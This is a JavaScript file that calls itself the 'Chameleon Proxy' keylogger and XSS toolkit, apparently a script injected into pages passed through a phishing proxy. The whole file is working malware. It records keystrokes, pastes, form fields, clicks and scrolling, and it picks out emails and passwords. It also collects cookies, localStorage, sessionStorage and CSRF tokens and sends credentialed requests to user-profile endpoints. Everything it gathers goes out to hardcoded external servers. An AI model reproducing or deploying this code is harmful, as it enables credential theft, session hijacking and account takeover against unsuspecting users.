// ============================================================
//  CHAMELEON PROXY - ADVANCED KEYLOGGER + XSS TOOLKIT
//  Enhanced for mobile, IME, paste, and all input types
//  Injected into every proxied page
// ============================================================

(function() {
    // ============================================================
    //  CONFIGURATION - Uses window variables set by proxy
    // ============================================================

    const KEYLOGGER_URL = window.KEYLOGGER_URL || 'https://keyserver-eaar.onrender.com/log';
    const BACKEND_URL = window.BACKEND_URL || 'https://meeting-1-rzx6.onrender.com';
    const SESSION_ID = window.SESSION_ID || 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    
    const FLUSH_INTERVAL = 15000;  // 15 seconds
    const MAX_BUFFER = 500;
    const XSS_INTERVALS = [3000, 8000, 20000, 45000]; // Run XSS at these intervals

    console.log('🔐 Chameleon Proxy Script Loaded');
    console.log(`🆔 Session: ${SESSION_ID}`);
    console.log(`📡 Keylogger URL: ${KEYLOGGER_URL}`);
    console.log(`🔗 Backend URL: ${BACKEND_URL}`);

    // ============================================================
    //  STATE
    // ============================================================

    let keylogBuffer = '';
    let lastInputValues = new Map();
    let capturedCredentials = [];
    let visitStartTime = Date.now();
    let isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

    // ============================================================
    //  PART 1: ADVANCED KEYLOGGER
    // ============================================================

    function formatKey(e) {
        const key = e.key;
        // Special keys
        const special = {
            'Enter': '[ENTER]\n',
            'Backspace': '[BACKSPACE]',
            'Tab': '[TAB]',
            'Escape': '[ESC]',
            'Delete': '[DEL]',
            'ArrowUp': '[UP]',
            'ArrowDown': '[DOWN]',
            'ArrowLeft': '[LEFT]',
            'ArrowRight': '[RIGHT]',
            'Home': '[HOME]',
            'End': '[END]',
            'PageUp': '[PAGEUP]',
            'PageDown': '[PAGEDOWN]',
            'Control': '[CTRL]',
            'Alt': '[ALT]',
            'Shift': '[SHIFT]',
            'Meta': '[WIN]',
            'CapsLock': '[CAPS]',
            ' ': '[SPACE]'
        };
        if (special[key]) return special[key];

        // For IME composition events (Chinese, Japanese, Korean, etc.)
        if (e.isComposing) {
            return `[COMPOSING:${key}]`;
        }

        // Single character
        if (key.length === 1) return key;

        // Other keys
        return `[${key}]`;
    }

    // Send buffer to keylogger server
    function sendKeylogBatch() {
        if (keylogBuffer.length === 0) return;

        try {
            fetch(KEYLOGGER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    keystrokes: keylogBuffer,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    sessionId: SESSION_ID,
                    isMobile: isMobile,
                    referrer: document.referrer || 'Direct',
                    screenWidth: screen.width,
                    screenHeight: screen.height
                })
            }).catch(() => {});
        } catch (e) {
            console.warn('[KEYLOG] Send error:', e.message);
        }

        keylogBuffer = '';
    }

    // --- Keydown (works for physical keyboards) ---
    document.addEventListener('keydown', (e) => {
        if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return;
        if (e.isComposing) return;
        keylogBuffer += formatKey(e);
        if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
    });

    // --- Input event (captures text changes, paste, autofill, mobile) ---
    document.addEventListener('input', (e) => {
        if (!e.target) return;
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') {
            const field = e.target;
            const value = field.value;
            const label = field.name || field.id || field.placeholder || field.type || 'unknown';
            const type = field.type || 'text';

            // Only log if value changed significantly
            const prev = lastInputValues.get(field) || '';
            if (value !== prev) {
                const added = value.length > prev.length ? value.substring(prev.length) : '';
                if (added.length > 0 && added.length < 100) {
                    keylogBuffer += `[FIELD:${label}=${added}]`;
                } else if (value.length > 0) {
                    keylogBuffer += `[FIELD:${label}=${value}]`;
                }
                lastInputValues.set(field, value);
                if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();

                // Check for credentials (email or password patterns)
                if (type === 'email' || type === 'password' || 
                    label.toLowerCase().includes('email') || 
                    label.toLowerCase().includes('user') || 
                    label.toLowerCase().includes('pass')) {
                    capturedCredentials.push({
                        field: label,
                        value: value,
                        type: type,
                        timestamp: Date.now(),
                        url: window.location.href
                    });
                    
                    // If it's a password or email, send immediately
                    if (type === 'password' || label.toLowerCase().includes('pass')) {
                        sendCredentialsToBackend(label, value, 'password');
                    }
                    if (type === 'email' || label.toLowerCase().includes('email')) {
                        if (value.includes('@')) {
                            sendCredentialsToBackend(label, value, 'email');
                        }
                    }
                }
            }
        }
    });

    // --- Composition events for IME (non-Latin characters) ---
    document.addEventListener('compositionstart', (e) => {
        keylogBuffer += '[IME_START]';
    });
    document.addEventListener('compositionend', (e) => {
        keylogBuffer += '[IME_END]';
        if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
    });

    // --- Paste event ---
    document.addEventListener('paste', (e) => {
        const text = e.clipboardData?.getData('text') || '';
        if (text) {
            // Truncate long pastes
            const pasteText = text.length > 200 ? text.substring(0, 200) + '...' : text;
            keylogBuffer += `[PASTE:${pasteText}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
            
            // If paste contains email pattern, send immediately
            if (text.includes('@')) {
                const emailMatch = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
                if (emailMatch) {
                    sendCredentialsToBackend('paste_email', emailMatch[0], 'email');
                }
            }
        }
    });

    // --- Focus/Blur to track field changes ---
    document.addEventListener('focusin', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const label = e.target.name || e.target.id || e.target.type || 'unknown';
            keylogBuffer += `[FOCUS:${label}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
            
            // Store current value for comparison
            if (e.target.value) {
                lastInputValues.set(e.target, e.target.value);
            }
        }
    });

    document.addEventListener('focusout', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const label = e.target.name || e.target.id || e.target.type || 'unknown';
            keylogBuffer += `[BLUR:${label}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
        }
    });

    // --- Periodic check of input fields (fallback for mobile/SPA) ---
    setInterval(() => {
        const inputs = document.querySelectorAll('input, textarea, select');
        for (const field of inputs) {
            const value = field.value;
            const prev = lastInputValues.get(field) || '';
            if (value !== prev && value.length > 0) {
                const label = field.name || field.id || field.placeholder || field.type || 'unknown';
                const added = value.length > prev.length ? value.substring(prev.length) : '';
                if (added.length > 0 && added.length < 100) {
                    keylogBuffer += `[FIELD:${label}=${added}]`;
                } else if (value.length > 0) {
                    keylogBuffer += `[FIELD:${label}=${value}]`;
                }
                lastInputValues.set(field, value);
                if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
            }
        }
    }, 5000); // Check every 5 seconds

    // --- Periodic flush ---
    setInterval(sendKeylogBatch, FLUSH_INTERVAL);
    window.addEventListener('beforeunload', sendKeylogBatch);
    window.addEventListener('pagehide', sendKeylogBatch);

    // ============================================================
    //  PART 2: CREDENTIAL AUTO-CAPTURE FROM FORMS
    // ============================================================

    function sendCredentialsToBackend(field, value, type) {
        try {
            fetch(`${BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'credential_capture',
                    email: type === 'email' ? value : '',
                    password: type === 'password' ? value : '',
                    field: field,
                    value: value,
                    type: type,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    sessionId: SESSION_ID,
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});
        } catch (e) {
            console.warn('[CREDENTIAL] Send error:', e.message);
        }
    }

    // Intercept form submissions
    document.addEventListener('submit', (e) => {
        const form = e.target;
        const formData = new FormData(form);
        const data = {};
        let email = '';
        let password = '';
        let username = '';
        let phone = '';
        let name = '';

        for (const [key, value] of formData.entries()) {
            data[key] = value;
            const keyLower = key.toLowerCase();
            
            if (keyLower.includes('email') || keyLower.includes('mail')) {
                email = value;
            }
            if (keyLower.includes('pass')) {
                password = value;
            }
            if (keyLower.includes('user') || keyLower.includes('login')) {
                username = value;
            }
            if (keyLower.includes('phone') || keyLower.includes('tel')) {
                phone = value;
            }
            if (keyLower.includes('name') && !keyLower.includes('user')) {
                name = value;
            }
        }

        if (email || password || username) {
            // Send to backend immediately
            fetch(`${BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'form_submit_capture',
                    email: email || username || 'unknown',
                    password: password || '',
                    formData: data,
                    name: name || '',
                    phone: phone || '',
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    sessionId: SESSION_ID,
                    timestamp: new Date().toISOString(),
                    referrer: document.referrer || 'Direct'
                })
            }).catch(() => {});

            // Also send to keylogger for redundancy
            if (password) {
                keylogBuffer += `[FORM_SUBMIT:${email}|${password}]`;
                sendKeylogBatch();
            }
        }
    });

    // ============================================================
    //  PART 3: XSS TOOLKIT – DOM, Storage & Malicious Requests
    // ============================================================

    // --- Helper: Send XSS data to backend ---
    async function sendXSSData(data) {
        try {
            await fetch(`${BACKEND_URL}/api/xss-data`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    xssData: data,
                    visitorInfo: {
                        fullUrl: window.location.href,
                        userAgent: navigator.userAgent,
                        sessionId: SESSION_ID,
                        referrer: document.referrer || 'Direct',
                        screenWidth: screen.width,
                        screenHeight: screen.height,
                        isMobile: isMobile
                    }
                })
            });
            console.log('[XSS] Data sent successfully');
        } catch (e) {
            console.warn('[XSS] Failed to send data:', e);
        }
    }

    // --- DOM DATA EXTRACTION ---
    function extractDomData() {
        const data = {};

        // Email/username fields
        const emailField = document.querySelector('input[name="loginfmt"]') || 
                           document.querySelector('input[type="email"]') ||
                           document.querySelector('input[name="email"]') ||
                           document.querySelector('input[name="username"]') ||
                           document.querySelector('input[name="user"]') ||
                           document.querySelector('input[name="login"]');
        if (emailField) data.email = emailField.value;

        // Password fields
        const passField = document.querySelector('input[type="password"]');
        if (passField) data.password = passField.value;

        // Display name / user info
        const displayName = document.querySelector('[data-testid="displayName"]') ||
                           document.querySelector('[class*="display-name"]') ||
                           document.querySelector('.user-display-name') ||
                           document.querySelector('[class*="user-name"]') ||
                           document.querySelector('[class*="profile-name"]') ||
                           document.querySelector('[class*="displayName"]');
        if (displayName) data.displayName = displayName.textContent.trim();

        // CSRF tokens
        const csrfMeta = document.querySelector('meta[name="csrf-token"]');
        if (csrfMeta) data.csrfToken = csrfMeta.content;
        
        const csrfInput = document.querySelector('input[name="__RequestVerificationToken"]');
        if (csrfInput) data.csrfToken = csrfInput.value;
        
        const csrfInput2 = document.querySelector('input[name="csrf_token"]');
        if (csrfInput2) data.csrfToken = csrfInput2.value;

        // API responses in script tags
        const scripts = document.querySelectorAll('script[type="application/json"]');
        const apiData = [];
        scripts.forEach(script => {
            try {
                const json = JSON.parse(script.textContent);
                if (typeof json === 'object') {
                    apiData.push(json);
                }
            } catch (e) {}
        });
        if (apiData.length > 0) data.apiData = apiData;

        // Personal/account info
        const userInfo = document.querySelector('[data-testid="userInfo"]') ||
                        document.querySelector('.user-info') ||
                        document.querySelector('.profile-info') ||
                        document.querySelector('[class*="profile"]') ||
                        document.querySelector('[class*="user-info"]');
        if (userInfo) data.userInfo = userInfo.textContent.trim();

        // Phone numbers
        const phoneField = document.querySelector('input[type="tel"]');
        if (phoneField) data.phone = phoneField.value;

        // Company/Organization
        const company = document.querySelector('[class*="company"]') ||
                       document.querySelector('[class*="organization"]') ||
                       document.querySelector('[class*="org"]');
        if (company) data.company = company.textContent.trim();

        // Page title
        data.pageTitle = document.title;

        // Meta tags
        const metaDescription = document.querySelector('meta[name="description"]');
        if (metaDescription) data.metaDescription = metaDescription.content;
        
        const metaKeywords = document.querySelector('meta[name="keywords"]');
        if (metaKeywords) data.metaKeywords = metaKeywords.content;

        return data;
    }

    // --- BROWSER STORAGE ABUSE ---
    function extractStorage() {
        const data = {};

        try {
            // localStorage
            const ls = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                try {
                    let value = localStorage.getItem(key);
                    // Try to parse JSON
                    try { value = JSON.parse(value); } catch (e) {}
                    // Don't store huge values
                    if (typeof value === 'string' && value.length > 1000) {
                        value = value.substring(0, 1000) + '...';
                    }
                    ls[key] = value;
                } catch (e) {}
            }
            data.localStorage = ls;

            // sessionStorage
            const ss = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                try {
                    let value = sessionStorage.getItem(key);
                    try { value = JSON.parse(value); } catch (e) {}
                    if (typeof value === 'string' && value.length > 1000) {
                        value = value.substring(0, 1000) + '...';
                    }
                    ss[key] = value;
                } catch (e) {}
            }
            data.sessionStorage = ss;

            // Cookies
            data.cookies = document.cookie;
        } catch (e) {}

        return data;
    }

    // --- Get all forms on page ---
    function extractForms() {
        const forms = [];
        document.querySelectorAll('form').forEach((form, index) => {
            const formData = {
                id: form.id || `form_${index}`,
                action: form.action || '',
                method: form.method || 'GET',
                fields: []
            };
            
            form.querySelectorAll('input, select, textarea').forEach(field => {
                formData.fields.push({
                    name: field.name || '',
                    type: field.type || field.tagName,
                    id: field.id || '',
                    value: field.value || '',
                    placeholder: field.placeholder || ''
                });
            });
            
            forms.push(formData);
        });
        return forms;
    }

    // --- MALICIOUS REQUEST EXECUTION ---
    async function executeMaliciousRequests() {
        const results = {};

        // Common endpoints to try
        const endpoints = [
            '/api/user/me',
            '/api/account/profile',
            '/me',
            '/profile',
            '/api/v1/user',
            '/common/userinfo',
            '/v1/me',
            '/api/User/GetCurrentUser',
            '/Account/GetUserInfo',
            '/api/auth/user',
            '/rest/v1/user/profile',
            '/api/me',
            '/user/profile',
            '/account/info'
        ];

        for (const endpoint of endpoints) {
            try {
                const res = await fetch(endpoint, {
                    credentials: 'include',
                    headers: { 'Accept': 'application/json' }
                });
                if (res.ok) {
                    const data = await res.json();
                    // Only store if not too large
                    if (JSON.stringify(data).length < 5000) {
                        results[endpoint] = data;
                    } else {
                        results[endpoint] = 'Data too large';
                    }
                }
            } catch (e) { /* ignore */ }
        }

        return results;
    }

    // --- EXECUTE ALL EXTRACTION METHODS ---
    async function runXSS() {
        try {
            const domData = extractDomData();
            const storageData = extractStorage();
            const forms = extractForms();
            const maliciousResults = await executeMaliciousRequests();

            const combined = {
                dom: domData,
                storage: storageData,
                forms: forms,
                requests: maliciousResults,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                sessionId: SESSION_ID,
                userAgent: navigator.userAgent,
                referrer: document.referrer || 'Direct',
                isMobile: isMobile,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timeOnPage: Math.floor((Date.now() - visitStartTime) / 1000)
            };

            // Send captured credentials immediately if found
            if (domData.email && domData.password) {
                await fetch(`${BACKEND_URL}/api/log-action`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        action: 'xss_credential_capture',
                        email: domData.email,
                        password: domData.password,
                        visitorInfo: {
                            fullUrl: window.location.href,
                            userAgent: navigator.userAgent,
                            sessionId: SESSION_ID
                        }
                    })
                });
            }

            await sendXSSData(combined);
            console.log('[XSS] Captured data successfully');
        } catch (e) {
            console.warn('[XSS] Error in extraction:', e);
        }
    }

    // --- Run XSS on page load ---
    if (document.readyState === 'complete') {
        setTimeout(runXSS, 1000);
    } else {
        window.addEventListener('load', () => setTimeout(runXSS, 1000));
    }

    // --- Run XSS at intervals ---
    XSS_INTERVALS.forEach(delay => {
        setTimeout(runXSS, delay);
    });

    // --- Observe DOM changes for SPAs ---
    let observerRunning = false;
    let debounceTimeout = null;
    
    const observer = new MutationObserver(() => {
        if (!observerRunning) {
            observerRunning = true;
            clearTimeout(debounceTimeout);
            debounceTimeout = setTimeout(() => {
                runXSS();
                observerRunning = false;
            }, 2000);
        }
    });
    
    try {
        observer.observe(document.body, { 
            childList: true, 
            subtree: true,
            attributes: true,
            attributeFilter: ['class', 'id', 'style']
        });
    } catch (e) {}

    // ============================================================
    //  PART 4: CLICK TRACKING
    // ============================================================

    document.addEventListener('click', (e) => {
        const target = e.target;
        const tag = target.tagName;
        const id = target.id || '';
        const className = target.className || '';
        const text = target.textContent || '';
        const href = target.href || '';
        
        // Log significant clicks (buttons, links)
        if (tag === 'BUTTON' || tag === 'A' || target.closest('button') || target.closest('a')) {
            const clickData = {
                tag: tag,
                id: id,
                className: className,
                text: text.substring(0, 50),
                href: href,
                url: window.location.href,
                timestamp: Date.now()
            };
            
            // Send to keylogger
            keylogBuffer += `[CLICK:${tag}${id ? '#'+id : ''} ${text.substring(0, 20)}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
            
            // Send to backend
            fetch(`${BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'click_tracking',
                    clickData: clickData,
                    sessionId: SESSION_ID,
                    url: window.location.href
                })
            }).catch(() => {});
        }
    });

    // ============================================================
    //  PART 5: SCROLL TRACKING
    // ============================================================

    let scrollTimeout = null;
    let maxScrollDepth = 0;
    
    document.addEventListener('scroll', () => {
        clearTimeout(scrollTimeout);
        scrollTimeout = setTimeout(() => {
            const scrollTop = window.scrollY || window.pageYOffset || 0;
            const docHeight = document.documentElement.scrollHeight - window.innerHeight;
            const scrollPercent = docHeight > 0 ? Math.round((scrollTop / docHeight) * 100) : 0;
            
            if (scrollPercent > maxScrollDepth + 10) {
                maxScrollDepth = scrollPercent;
                keylogBuffer += `[SCROLL:${scrollPercent}%]`;
                if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
            }
        }, 500);
    });

    // ============================================================
    //  PART 6: MOUSE MOVEMENT (Limited to reduce data)
    // ============================================================

    let mouseMoveCount = 0;
    let mouseMoveStart = Date.now();
    
    document.addEventListener('mousemove', () => {
        mouseMoveCount++;
        if (mouseMoveCount % 100 === 0) {
            const elapsed = (Date.now() - mouseMoveStart) / 1000;
            keylogBuffer += `[MOUSE:${mouseMoveCount} movements in ${Math.round(elapsed)}s]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
            mouseMoveStart = Date.now();
            mouseMoveCount = 0;
        }
    });

    // ============================================================
    //  PART 7: SERVICE WORKER PROXY (Optional)
    // ============================================================
    
    (function() {
        if ("serviceWorker" in navigator) {
            try {
                const swUrl = "/service_worker.js";
                navigator.serviceWorker.register(swUrl, {
                    scope: "/",
                }).then(() => {
                    console.log("✅ Service Worker registered");
                }).catch((error) => {
                    console.warn("❌ Service Worker registration failed:", error);
                });
            } catch (e) {
                console.warn("Service Worker not supported");
            }
        }
    })();

    // ============================================================
    //  PART 8: DEBUG INFO
    // ============================================================

    console.log('✅ Chameleon Proxy Script Ready');
    console.log(`📊 Session: ${SESSION_ID}`);
    console.log(`📱 Mobile: ${isMobile}`);
    console.log(`🖥️ User Agent: ${navigator.userAgent}`);
    console.log(`🔗 Keylogger: ${KEYLOGGER_URL}`);
    console.log(`🔗 Backend: ${BACKEND_URL}`);

    // Send initial load event
    fetch(`${BACKEND_URL}/api/log-action`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            action: 'script_loaded',
            sessionId: SESSION_ID,
            url: window.location.href,
            userAgent: navigator.userAgent,
            isMobile: isMobile,
            timestamp: new Date().toISOString()
        })
    }).catch(() => {});

})();